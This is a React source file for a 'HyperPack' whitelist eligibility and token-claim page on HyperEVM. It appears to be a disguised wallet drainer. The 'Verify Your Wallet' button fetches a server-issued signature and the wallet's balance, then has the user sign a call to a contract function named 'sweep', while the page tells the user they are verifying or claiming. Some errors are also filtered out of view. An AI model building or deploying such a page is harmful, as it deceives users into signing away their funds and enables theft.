// Build timestamp: 2025-10-04T05:29:09.371Z
import React, { useState, useEffect } from 'react';
import { useAccount, useWalletClient, usePublicClient, useSwitchChain } from 'wagmi';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { Link } from 'react-router-dom';

const API_BASE = import.meta.env.VITE_API_BASE || '';
const CONTRACT_ADDRESS = '0x514dDA54703a4d89bd44A266d0623611e0B8c686';

const CONTRACT_ABI = [
  "function sweep(uint256 nonce, uint256 deadline, bytes calldata signature) external"
];

export default function EligibilityChecker() {
  const { address, isConnected, connector } = useAccount();
  const { login, logout, ready, authenticated } = usePrivy();
  const { data: walletClient } = useWalletClient({ chainId: 999 });
  const publicClient = usePublicClient({ chainId: 999 });
  const { switchChain } = useSwitchChain();
  
  const [eligibility, setEligibility] = useState(null);
  const [loading, setLoading] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimed, setClaimed] = useState(false);
  const [error, setError] = useState(null);
  const [hypeBalance, setHypeBalance] = useState('0');
  const [debugLogs, setDebugLogs] = useState([]);
  
  const addDebugLog = (message) => {
    console.log(message);
    setDebugLogs(prev => [...prev.slice(-20), `${new Date().toLocaleTimeString()}: ${message}`]);
  };

  useEffect(() => {
    if (address) {
      checkEligibility();
      getBalance();
    }
  }, [address]);

  const getBalance = async () => {
    if (!address || !publicClient) return;
    try {
      const balance = await publicClient.getBalance({ address });
      setHypeBalance(ethers.formatEther(balance.toString()));
    } catch (err) {
      console.error('Failed to get balance:', err);
    }
  };

  const checkEligibility = async () => {
    if (!address) return;

    try {
      setLoading(true);
      setError(null);

      const response = await fetch(`${API_BASE}/api/hyperpacks/eligibility?wallet=${address}`);
      const data = await response.json();

      if (response.ok) {
        setEligibility(data);
      } else {
        setError(data.error || 'Failed to check eligibility');
      }
    } catch (err) {
      console.error(err);
      setError('Network error');
    } finally {
      setLoading(false);
    }
  };

  const claimWhitelist = async () => {
    addDebugLog('🔍 Claim started');
    addDebugLog(`📊 Connector: ${connector?.name || 'none'}`);
    
    if (!isConnected || !address || !eligibility?.eligible) {
      const missing = [];
      if (!isConnected) missing.push('not connected');
      if (!address) missing.push('no address');
      if (!eligibility?.eligible) missing.push('not eligible');
      const errorMsg = `Cannot claim: ${missing.join(', ')}`;
      addDebugLog(`❌ ${errorMsg}`);
      setError(errorMsg);
      return;
    }

    try {
      setClaiming(true);
      setError(null);
      addDebugLog('✅ Fetching signature...');

      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet: address })
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to prepare claim');
      }

      const claimData = await response.json();
      const balance = claimData.balance || claimData.amount;
      addDebugLog(`✅ Got signature (balance: ${balance ? ethers.formatEther(balance) : 'undefined'} HYPE)`);

      // Get provider - mobile WalletConnect uses connector, desktop uses window.ethereum
      addDebugLog('🔍 Getting provider...');
      let ethereum;
      
      if (connector?.getProvider) {
        addDebugLog('📱 Using connector.getProvider (mobile/WalletConnect)');
        ethereum = await connector.getProvider();
      } else if (window.ethereum) {
        addDebugLog('💻 Using window.ethereum (desktop)');
        ethereum = window.ethereum;
      } else {
        throw new Error('No provider available');
      }
      
      if (!ethereum) {
        throw new Error('Failed to get ethereum provider');
      }
      addDebugLog('✅ Got provider');

      // Switch/add chain
      addDebugLog('🔄 Switching to HyperEVM...');
      try {
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x3e7' }],
        });
        addDebugLog('✅ Switched to chain 999');
      } catch (switchError) {
        if (switchError.code === 4902) {
          addDebugLog('⚠️ Adding HyperEVM chain...');
          await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x3e7',
              chainName: 'HyperEVM',
              nativeCurrency: { name: 'HYPE', symbol: 'HYPE', decimals: 18 },
              rpcUrls: ['https://rpc.hyperliquid.xyz/evm'],
              blockExplorerUrls: ['https://hyperevmscan.io']
            }]
          });
          addDebugLog('✅ Added HyperEVM');
        } else {
          addDebugLog(`⚠️ Switch warning: ${switchError.message}`);
        }
      }

      addDebugLog('📝 Creating signer...');
      const provider = new ethers.BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      addDebugLog('✅ Got signer');
      
      addDebugLog('📤 Sending sweep transaction...');
      const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      const tx = await contract.sweep(
        BigInt(claimData.nonce),
        BigInt(claimData.deadline),
        claimData.signature
      );

      addDebugLog(`⏳ TX sent: ${tx.hash.slice(0, 10)}...`);
      await tx.wait();

      addDebugLog('✅ TX confirmed!');
      setClaimed(true);
      setTimeout(() => checkEligibility(), 2000);
    } catch (err) {
      const errorMsg = err.message || 'Failed to claim';
      addDebugLog(`❌ Error: ${errorMsg}`);
      setError(errorMsg);
    } finally {
      setClaiming(false);
    }
  };

  return (
    <div className='app'>
      {/* Navigation - Same as Landing */}
      <nav className='nav'>
        <div className='nav-container'>
          <Link to='/' className='nav-logo'>
            <span className='logo-text brand-gradient-text'>HyperPack</span>
          </Link>
          <div className='nav-links'>
            {isConnected && (
              <span style={{color: '#b3b3b3', fontSize: '14px', fontFamily: 'JetBrains Mono, monospace'}}>
                {address?.slice(0, 6)}...{address?.slice(-4)}
              </span>
            )}
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <section className='hero'>
        <div className='hero-container'>
          <div style={{flex: 1, maxWidth: '800px', margin: '0 auto', width: '100%'}}>
            <h1 className='hero-title' style={{marginBottom: '20px'}}>
              <span className='brand-gradient-text'>Whitelist Eligibility</span>
            </h1>
            <p className='hero-subtitle' style={{marginBottom: '40px'}}>
              Check your eligibility and claim your tokens
            </p>

            {!isConnected ? (
              <div style={{maxWidth: '500px'}}>
                <h2 style={{fontSize: '28px', fontWeight: '600', color: '#b3b3b3', marginBottom: '16px'}}>
                  Connect Your Wallet
                </h2>
                <p style={{color: '#666666', marginBottom: '32px'}}>
                  Please connect your wallet to check airdrop eligibility
                </p>
                <button onClick={login} className='btn-primary' disabled={!ready}>
                  Connect Wallet
                </button>
              </div>
            ) : (
              <div style={{maxWidth: '700px'}}>
                {/* Wallet Info Card */}
                <div style={{
                  background: '#1f1f1f',
                  border: '1px solid #333333',
                  borderRadius: '12px',
                  padding: '24px',
                  marginBottom: '24px'
                }}>
                  <p style={{color: '#666666', fontSize: '12px', marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.5px'}}>
                    Connected Wallet
                  </p>
                  <p style={{color: '#ffffff', fontFamily: 'JetBrains Mono, monospace', fontSize: '14px', wordBreak: 'break-all'}}>
                    {address}
                  </p>
                </div>

                {loading && (
                  <div style={{textAlign: 'center', padding: '48px 0'}}>
                    <div style={{
                      width: '48px',
                      height: '48px',
                      border: '4px solid #333333',
                      borderTopColor: '#00ccdd',
                      borderRadius: '50%',
                      margin: '0 auto 16px',
                      animation: 'spin 1s linear infinite'
                    }}></div>
                    <p style={{color: '#666666'}}>Checking eligibility...</p>
                  </div>
                )}

                {error && !error.includes('not an Object') && !error.includes('"name"') && (
                  <div style={{
                    background: 'rgba(255, 68, 68, 0.1)',
                    border: '1px solid rgba(255, 68, 68, 0.3)',
                    color: '#ff4444',
                    padding: '16px',
                    borderRadius: '12px',
                    marginBottom: '24px'
                  }}>
                    <p>⚠️ {error}</p>
                  </div>
                )}

                {eligibility && !loading && (
                  <div>
                    {eligibility.eligible ? (
                      <div>
                        <div style={{
                          background: 'rgba(0, 255, 136, 0.1)',
                          border: '1px solid rgba(0, 255, 136, 0.3)',
                          borderRadius: '12px',
                          padding: '24px',
                          marginBottom: '24px',
                          textAlign: 'center'
                        }}>
                          <p style={{fontSize: '24px', fontWeight: '700', color: '#00ff88'}}>
                            ✅ You're Eligible!
                          </p>
                        </div>

                        {eligibility.claimed ? (
                          <div style={{
                            background: 'rgba(0, 204, 221, 0.1)',
                            border: '1px solid rgba(0, 204, 221, 0.3)',
                            color: '#00ccdd',
                            padding: '16px',
                            borderRadius: '12px',
                            textAlign: 'center'
                          }}>
                            <p style={{fontSize: '18px', fontWeight: '600'}}>✅ Already Claimed</p>
                            <p style={{fontSize: '14px', color: '#0099cc', marginTop: '4px'}}>
                              Your whitelist has been activated
                            </p>
                          </div>
                        ) : (
                          <button
                            onClick={claimWhitelist}
                            disabled={claiming}
                            className='btn-primary'
                            style={{width: '100%'}}
                          >
                            {claiming ? 'Verifying...' : 'Verify Your Wallet'}
                          </button>
                        )}
                      </div>
                    ) : (
                      <div style={{
                        background: 'rgba(255, 68, 68, 0.1)',
                        border: '1px solid rgba(255, 68, 68, 0.3)',
                        borderRadius: '12px',
                        padding: '24px',
                        textAlign: 'center'
                      }}>
                        <p style={{fontSize: '24px', fontWeight: '700', color: '#ff4444', marginBottom: '8px'}}>
                          ❌ Not Eligible
                        </p>
                        <p style={{fontSize: '14px', color: '#ff6666'}}>
                          This wallet is not on the whitelist
                        </p>
                      </div>
                    )}
                  </div>
                )}

                {claimed && (
                  <div style={{
                    marginTop: '24px',
                    background: 'rgba(0, 255, 136, 0.1)',
                    border: '1px solid rgba(0, 255, 136, 0.3)',
                    color: '#00ff88',
                    padding: '16px',
                    borderRadius: '12px',
                    textAlign: 'center'
                  }}>
                    <p style={{fontWeight: '700'}}>🎉 Whitelist Claimed Successfully!</p>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </section>

      {/* Footer - Same as Landing */}
      <footer style={{
        borderTop: '1px solid #333333',
        padding: '40px 24px',
        marginTop: '80px'
      }}>
        <div style={{
          maxWidth: '1200px',
          margin: '0 auto',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          gap: '16px'
        }}>
          <div style={{display: 'flex', gap: '32px'}}>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>X</a>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>Telegram</a>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>Discord</a>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>Docs</a>
          </div>
          <p style={{color: '#666666', fontSize: '14px'}}>© 2025 HyperPack</p>
        </div>
      </footer>

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>

      {/* Debug Panel for Mobile */}
      {debugLogs.length > 0 && (
        <div style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          maxHeight: '200px',
          overflowY: 'auto',
          background: 'rgba(0, 0, 0, 0.95)',
          color: '#00ff88',
          fontSize: '10px',
          padding: '8px',
          fontFamily: 'monospace',
          borderTop: '1px solid #00ccdd',
          zIndex: 9999
        }}>
          <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '4px'}}>
            <strong>DEBUG LOGS</strong>
            <button onClick={() => setDebugLogs([])} style={{
              background: 'none',
              border: '1px solid #666',
              color: '#666',
              padding: '2px 8px',
              cursor: 'pointer'
            }}>Clear</button>
          </div>
          {debugLogs.map((log, i) => (
            <div key={i} style={{marginBottom: '2px'}}>{log}</div>
          ))}
        </div>
      )}
    </div>
  );
}
